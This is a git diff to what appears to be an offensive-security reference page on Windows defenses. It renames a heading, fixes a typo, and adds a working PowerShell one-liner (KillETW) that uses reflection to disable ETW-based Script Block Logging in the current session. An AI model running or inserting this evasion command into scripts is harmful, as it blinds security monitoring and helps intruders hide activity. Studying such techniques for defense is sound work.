@@ -9,7 +9,7 @@
     * [Anti Malware Scan Interface](#anti-malware-scan-interface)
     * [Just Enough Administration](#just-enough-administration)
     * [Contrained Language Mode](#constrained-language-mode)
-    * [Script Block Logging](#script-block-logging)
+    * [Script Block and Module Logging](#script-block-and-module-logging)
     * [SecureString](#securestring)
 * [Protected Process Light](#protected-process-light)
 * [Credential Guard](#credential-guard)
@@ -147,11 +147,11 @@ Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageM
     ```
 
 
-### Script Block Logging
+### Script Block and Module Logging
 
 > Once Script Block Logging is enabled, the script blocks and commands that are executed will be recorded in the Windows event log under the "Windows PowerShell" channel. To view the logs, administrators can use the Event Viewer application and navigate to the "Windows PowerShell" channel.
 
-Enable Script Block Loggin:
+Enable Script Block Logging:
 
 ```ps1
 function Enable-PSScriptBlockLogging
@@ -166,6 +166,13 @@ function Enable-PSScriptBlockLogging
 
     Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "1"
 }
+```
+
+Disable ETW of the current PowerShell session with [tandasat/KillETW.ps1](https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32): 
+
+```ps1
+# This PowerShell command sets 0 to System.Management.Automation.Tracing.PSEtwLogProvider etwProvider.m_enabled which effectively disables Suspicious ScriptBlock Logging etc.
+[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
 ```
 
 
